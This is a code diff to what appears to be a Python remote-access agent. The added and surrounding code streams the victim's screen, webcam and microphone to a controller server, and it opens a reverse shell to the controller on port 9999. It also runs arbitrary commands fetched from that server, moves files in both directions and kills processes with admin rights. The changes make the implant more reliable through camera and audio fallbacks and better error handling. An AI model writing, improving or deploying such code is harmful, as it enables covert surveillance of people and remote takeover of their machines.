@@ -2457,8 +2457,18 @@ def _stream_screen_fallback(agent_id):
 
     try:
         with mss.mss() as sct:
+            # Get available monitors
+            monitors = sct.monitors
+            if len(monitors) < 2:
+                print(f"Warning: Only {len(monitors)} monitor(s) available, using primary")
+                monitor_index = 1  # Primary monitor
+            else:
+                monitor_index = 1  # Primary monitor (index 1)
+            
+            print(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
+            
             # Optimize for higher FPS than original
-            target_fps = 45  # Increased from 30
+            target_fps = 30  # Reduced from 45 for better stability
             frame_time = 1.0 / target_fps
             last_frame_hash = None
             frame_skip_count = 0
@@ -2468,7 +2478,7 @@ def _stream_screen_fallback(agent_id):
                     current_time = time.time()
                     
                     # Get raw pixels from the screen
-                    sct_img = sct.grab(sct.monitors[1])
+                    sct_img = sct.grab(monitors[monitor_index])
                     
                     # Create an OpenCV image
                     img = np.array(sct_img)
@@ -2478,7 +2488,7 @@ def _stream_screen_fallback(agent_id):
                     frame_hash = hashlib.md5(img.tobytes()).hexdigest()
                     if frame_hash == last_frame_hash:
                         frame_skip_count += 1
-                        if frame_skip_count < 5:  # Skip up to 5 identical frames
+                        if frame_skip_count < 3:  # Reduced from 5 for better responsiveness
                             time.sleep(frame_time * 0.5)
                             continue
                     
@@ -2487,15 +2497,15 @@ def _stream_screen_fallback(agent_id):
                     
                     # Resize for better performance if screen is too large
                     height, width = img.shape[:2]
-                    if width > 1920:
-                        scale = 1920 / width
+                    if width > 1280:  # Reduced from 1920 for better performance
+                        scale = 1280 / width
                         new_width = int(width * scale)
                         new_height = int(height * scale)
                         img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
                     
                     # Encode with better compression settings
                     is_success, buffer = cv2.imencode(".jpg", img, [
-                        cv2.IMWRITE_JPEG_QUALITY, 90,  # Slightly higher quality
+                        cv2.IMWRITE_JPEG_QUALITY, 80,  # Reduced from 90 for better performance
                         cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                         cv2.IMWRITE_JPEG_PROGRESSIVE, 1
                     ])
@@ -2504,7 +2514,9 @@ def _stream_screen_fallback(agent_id):
 
                     # Send the frame asynchronously with shorter timeout
                     try:
-                        requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.05)
+                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
+                        if response.status_code != 200:
+                            print(f"Warning: Server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
                         pass  # Skip frame if timeout
                     except requests.exceptions.RequestException as e:
@@ -2539,27 +2551,56 @@ def stream_camera(agent_id):
     headers = {'Content-Type': 'image/jpeg'}
 
     try:
-        # Use CAP_DSHOW on Windows for better device compatibility and performance.
+        # Try different camera backends
+        cap = None
+        backends = []
+        
         if WINDOWS_AVAILABLE:
-            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]
         else:
-            cap = cv2.VideoCapture(0)
-            
-        if not cap.isOpened():
-            print("Error: Could not open camera")
+            backends = [cv2.CAP_V4L2, cv2.CAP_ANY]
+        
+        for backend in backends:
+            try:
+                cap = cv2.VideoCapture(0, backend)
+                if cap.isOpened():
+                    print(f"Camera opened successfully with backend {backend}")
+                    break
+                else:
+                    cap.release()
+            except Exception as e:
+                print(f"Failed to open camera with backend {backend}: {e}")
+                if cap:
+                    cap.release()
+        
+        if not cap or not cap.isOpened():
+            print("Error: Could not open camera with any backend")
             return
         
         # Set camera properties for better performance
         cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
         cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
         cap.set(cv2.CAP_PROP_FPS, 30)
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reduce buffer for lower latency
+        
+        # Verify camera settings
+        actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
+        actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
+        actual_fps = cap.get(cv2.CAP_PROP_FPS)
+        print(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
+        
+        frame_count = 0
+        start_time = time.time()
         
         while CAMERA_STREAMING_ENABLED:
             try:
                 ret, frame = cap.read()
                 if not ret:
                     print("Error: Could not read frame from camera")
-                    break
+                    time.sleep(0.1)
+                    continue
+                
+                frame_count += 1
                 
                 # Resize frame for better performance
                 frame = cv2.resize(frame, (640, 480))
@@ -2575,12 +2616,20 @@ def stream_camera(agent_id):
                 
                 # Send frame
                 try:
-                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
+                    response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
+                    if response.status_code != 200:
+                        print(f"Warning: Camera stream server returned status {response.status_code}")
                 except requests.exceptions.Timeout:
                     pass  # Skip frame if timeout
                 except requests.exceptions.RequestException as e:
                     print(f"Camera stream request error: {e}")
                     break
+                
+                # Log FPS every 30 frames
+                if frame_count % 30 == 0:
+                    elapsed = time.time() - start_time
+                    fps = frame_count / elapsed
+                    print(f"Camera streaming at {fps:.1f} FPS")
                 
                 # Maintain FPS
                 time.sleep(1/30)  # 30 FPS
@@ -2613,34 +2662,79 @@ def stream_audio(agent_id):
     try:
         p = pyaudio.PyAudio()
         
+        # Get available input devices
+        input_devices = []
+        for i in range(p.get_device_count()):
+            try:
+                device_info = p.get_device_info_by_index(i)
+                if device_info['maxInputChannels'] > 0:
+                    input_devices.append((i, device_info['name']))
+            except Exception:
+                continue
+        
+        print(f"Available input devices: {len(input_devices)}")
+        for idx, name in input_devices:
+            print(f"  Device {idx}: {name}")
+        
         # Get default input device info
+        input_device_index = None
         try:
             default_device_info = p.get_default_input_device_info()
-            print(f"Attempting to use default audio device: {default_device_info['name']}")
+            print(f"Default audio device: {default_device_info['name']}")
             input_device_index = default_device_info['index']
         except Exception as e:
             print(f"Could not get default audio device: {e}")
-            input_device_index = None
+            # Try to use first available device
+            if input_devices:
+                input_device_index = input_devices[0][0]
+                print(f"Using first available device: {input_devices[0][1]}")
+        
+        if input_device_index is None:
+            print("Error: No audio input devices available")
+            p.terminate()
+            return
         
         # Open audio stream
-        stream = p.open(
-            format=FORMAT, 
-            channels=CHANNELS, 
-            rate=RATE, 
-            input=True, 
-            frames_per_buffer=CHUNK, 
-            input_device_index=input_device_index
-        )
+        try:
+            stream = p.open(
+                format=FORMAT, 
+                channels=CHANNELS, 
+                rate=RATE, 
+                input=True, 
+                frames_per_buffer=CHUNK, 
+                input_device_index=input_device_index
+            )
+            print(f"Audio stream opened successfully with device {input_device_index}")
+        except Exception as e:
+            print(f"Failed to open audio stream: {e}")
+            p.terminate()
+            return
+        
+        frame_count = 0
+        start_time = time.time()
         
         while AUDIO_STREAMING_ENABLED:
             try:
                 data = stream.read(CHUNK, exception_on_overflow=False)
-                requests.post(url, data=data, timeout=1)
-            except requests.exceptions.Timeout:
-                pass  # Skip frame if timeout
-            except requests.exceptions.RequestException as e:
-                print(f"Audio stream request error: {e}")
-                break
+                frame_count += 1
+                
+                # Send audio data
+                try:
+                    response = requests.post(url, data=data, timeout=1)
+                    if response.status_code != 200:
+                        print(f"Warning: Audio stream server returned status {response.status_code}")
+                except requests.exceptions.Timeout:
+                    pass  # Skip frame if timeout
+                except requests.exceptions.RequestException as e:
+                    print(f"Audio stream request error: {e}")
+                    break
+                
+                # Log FPS every 100 frames
+                if frame_count % 100 == 0:
+                    elapsed = time.time() - start_time
+                    fps = frame_count / elapsed
+                    print(f"Audio streaming at {fps:.1f} FPS")
+                
             except Exception as e:
                 print(f"Audio stream error: {e}")
                 break
@@ -2721,9 +2815,26 @@ def reverse_shell_handler(agent_id):
     try:
         # Create socket connection back to controller
         REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        controller_host = SERVER_URL.split("://")[1].split(":")[0]  # Extract host from SERVER_URL
+        
+        # Parse SERVER_URL properly
+        try:
+            if SERVER_URL.startswith("https://"):
+                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
+            elif SERVER_URL.startswith("http://"):
+                controller_host = SERVER_URL.split("://")[1].split(":")[0].split("/")[0]
+            else:
+                # Assume it's just a hostname
+                controller_host = SERVER_URL.split(":")[0].split("/")[0]
+        except Exception as e:
+            print(f"Error parsing SERVER_URL: {e}")
+            controller_host = "localhost"  # Fallback
+        
         controller_port = 9999  # Dedicated port for reverse shell
         
+        print(f"Attempting reverse shell connection to {controller_host}:{controller_port}")
+        
+        # Set socket timeout
+        REVERSE_SHELL_SOCKET.settimeout(10)
         REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
         print(f"Reverse shell connected to {controller_host}:{controller_port}")
         
@@ -2742,14 +2853,18 @@ def reverse_shell_handler(agent_id):
                 # Receive command from controller
                 data = REVERSE_SHELL_SOCKET.recv(4096)
                 if not data:
+                    print("No data received from controller, breaking connection")
                     break
                     
                 command = data.decode().strip()
                 if not command:
                     continue
                     
+                print(f"Received command: {command}")
+                
                 # Handle special commands
                 if command.lower() == "exit":
+                    print("Received exit command")
                     break
                 elif command.startswith("cd "):
                     try:
@@ -2785,7 +2900,11 @@ def reverse_shell_handler(agent_id):
                         response = f"[Command execution error: {str(e)}]\n"
                 
                 # Send response back
-                REVERSE_SHELL_SOCKET.send(response.encode())
+                try:
+                    REVERSE_SHELL_SOCKET.send(response.encode())
+                except Exception as e:
+                    print(f"Error sending response: {e}")
+                    break
                 
             except socket.timeout:
                 continue
@@ -2824,8 +2943,11 @@ def stop_reverse_shell():
                 REVERSE_SHELL_SOCKET.close()
             except:
                 pass
-        if REVERSE_SHELL_THREAD:
-            REVERSE_SHELL_THREAD.join(timeout=2)
+        if REVERSE_SHELL_THREAD and REVERSE_SHELL_THREAD.is_alive():
+            try:
+                REVERSE_SHELL_THREAD.join(timeout=1)  # Reduced timeout
+            except Exception as e:
+                print(f"Warning: Could not join reverse shell thread: {e}")
         REVERSE_SHELL_THREAD = None
         print("Stopped reverse shell.")
 
@@ -3300,19 +3422,26 @@ def handle_file_upload(command_parts):
         file_content_b64 = command_parts[2]
         
         # Security: Validate path to prevent directory traversal
-        destination_path = os.path.abspath(destination_path)
-        if not destination_path.startswith(os.getcwd()):
-            return "Error: Invalid destination path - security restriction"
+        try:
+            destination_path = os.path.abspath(destination_path)
+            # Allow uploads to current directory and subdirectories
+            current_dir = os.getcwd()
+            if not destination_path.startswith(current_dir):
+                return f"Error: Invalid destination path - security restriction. Must be within {current_dir}"
+        except Exception as e:
+            return f"Error: Invalid path format: {e}"
         
         # Validate base64 content
         try:
             file_content = base64.b64decode(file_content_b64)
-        except Exception:
-            return "Error: Invalid base64 content"
+        except Exception as e:
+            return f"Error: Invalid base64 content: {e}"
         
         # Ensure directory exists
         try:
-            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+            dir_path = os.path.dirname(destination_path)
+            if dir_path and not os.path.exists(dir_path):
+                os.makedirs(dir_path, exist_ok=True)
         except Exception as e:
             return f"Error creating directory: {e}"
         
@@ -3339,9 +3468,14 @@ def handle_file_download(command_parts, agent_id):
         file_path = command_parts[1]
         
         # Security: Validate path to prevent directory traversal
-        file_path = os.path.abspath(file_path)
-        if not file_path.startswith(os.getcwd()):
-            return "Error: Invalid file path - security restriction"
+        try:
+            file_path = os.path.abspath(file_path)
+            # Allow downloads from current directory and subdirectories
+            current_dir = os.getcwd()
+            if not file_path.startswith(current_dir):
+                return f"Error: Invalid file path - security restriction. Must be within {current_dir}"
+        except Exception as e:
+            return f"Error: Invalid path format: {e}"
         
         if not os.path.exists(file_path):
             return f"File not found: {file_path}"
@@ -3364,8 +3498,14 @@ def handle_file_download(command_parts, agent_id):
         except Exception as e:
             return f"Error reading file: {e}"
         
-        # Send file to controller via socketio instead of HTTP
+        # Send file to controller via socketio
         try:
+            if not SOCKETIO_AVAILABLE or not sio:
+                return "Error: Socket.IO not available for file transfer"
+            
+            if not sio.connected:
+                return "Error: Not connected to controller via Socket.IO"
+            
             filename = os.path.basename(file_path)
             sio.emit('file_download', {
                 'agent_id': agent_id,
@@ -3528,10 +3668,18 @@ def execute_command(command):
                 text=True,
                 timeout=30
             )
+        
         output = result.stdout + result.stderr
         if not output:
             return "[No output from command]"
         return output
+    except subprocess.TimeoutExpired:
+        return "Command execution timed out after 30 seconds"
+    except FileNotFoundError:
+        if WINDOWS_AVAILABLE:
+            return "PowerShell not found. Command execution failed."
+        else:
+            return "Bash not found. Command execution failed."
     except Exception as e:
         return f"Command execution failed: {e}"
 
@@ -3567,6 +3715,8 @@ def main_loop(agent_id):
             task = response.json()
             command = task.get("command", "sleep")
 
+            print(f"Received command: {command}")
+
             if command in internal_commands:
                 try:
                     internal_commands[command]()
@@ -3575,29 +3725,52 @@ def main_loop(agent_id):
                     output = f"Internal command '{command}' failed: {e}"
             elif command.startswith("upload-file:"):
                 # Split by first two colons: upload-file:path:content
-                parts = command.split(":", 2)
-                output = handle_file_upload(parts)
+                try:
+                    parts = command.split(":", 2)
+                    if len(parts) >= 3:
+                        output = handle_file_upload(parts)
+                    else:
+                        output = "Invalid upload-file command format. Expected: upload-file:path:content"
+                except Exception as e:
+                    output = f"File upload error: {e}"
             elif command.startswith("download-file:"):
                 # Split by first colon: download-file:path
-                parts = command.split(":", 1)
-                output = handle_file_download(parts, agent_id)
+                try:
+                    parts = command.split(":", 1)
+                    if len(parts) >= 2:
+                        output = handle_file_download(parts, agent_id)
+                    else:
+                        output = "Invalid download-file command format. Expected: download-file:path"
+                except Exception as e:
+                    output = f"File download error: {e}"
             elif command.startswith("play-voice:"):
-                output = handle_voice_playback(command.split(":", 1))
+                try:
+                    parts = command.split(":", 1)
+                    output = handle_voice_playback(parts)
+                except Exception as e:
+                    output = f"Voice playback error: {e}"
             elif command.startswith("live-audio:"):
-                output = handle_live_audio(command.split(":", 1))
+                try:
+                    parts = command.split(":", 1)
+                    output = handle_live_audio(parts)
+                except Exception as e:
+                    output = f"Live audio error: {e}"
             elif command.startswith("terminate-process:"):
                 # Handle process termination with admin privileges
-                parts = command.split(":", 1)
-                if len(parts) > 1:
-                    process_target = parts[1]
-                    # Try to convert to int (PID) or use as string (process name)
-                    try:
-                        process_target = int(process_target)
-                    except ValueError:
-                        pass  # Keep as string (process name)
-                    output = terminate_process_with_admin(process_target, force=True)
-                else:
-                    output = "Invalid terminate-process command format"
+                try:
+                    parts = command.split(":", 1)
+                    if len(parts) > 1:
+                        process_target = parts[1]
+                        # Try to convert to int (PID) or use as string (process name)
+                        try:
+                            process_target = int(process_target)
+                        except ValueError:
+                            pass  # Keep as string (process name)
+                        output = terminate_process_with_admin(process_target, force=True)
+                    else:
+                        output = "Invalid terminate-process command format"
+                except Exception as e:
+                    output = f"Process termination error: {e}"
             elif command.startswith("{") and "remote_control" in command:
                 # Handle remote control commands (JSON format)
                 try:
@@ -3617,11 +3790,16 @@ def main_loop(agent_id):
                 output = "Slept for 1 second"
             else:
                 # Execute as system command
-                output = execute_command(command)
+                try:
+                    output = execute_command(command)
+                except Exception as e:
+                    output = f"Command execution error: {e}"
             
             # Send output back to server
             try:
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
+                response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
+                if response.status_code != 200:
+                    print(f"Warning: Server returned status {response.status_code} when posting output")
             except requests.exceptions.RequestException as e:
                 print(f"Failed to send output to server: {e}")
             
@@ -6125,18 +6303,25 @@ def on_key_press(data):
 
 @sio.on('file_upload')
 def on_file_upload(data):
-    """Handle file upload from controller via socketio."""
+    """Handle file upload via Socket.IO."""
     try:
+        if not data or not isinstance(data, dict):
+            sio.emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
+            return
+        
         destination_path = data.get('destination_path')
         file_content_b64 = data.get('content')
         
         if not destination_path or not file_content_b64:
-            sio.emit('file_upload_result', {'success': False, 'error': 'Missing parameters'})
+            sio.emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
             return
         
         # Use the existing handle_file_upload function
         result = handle_file_upload(['upload-file', destination_path, file_content_b64])
-        success = 'successfully' in result.lower() and 'error' not in result.lower()
+        
+        # Check if upload was successful
+        success = not result.startswith('Error:') and not result.startswith('File upload failed:')
+        
         sio.emit('file_upload_result', {'success': success, 'result': result})
         
     except Exception as e:
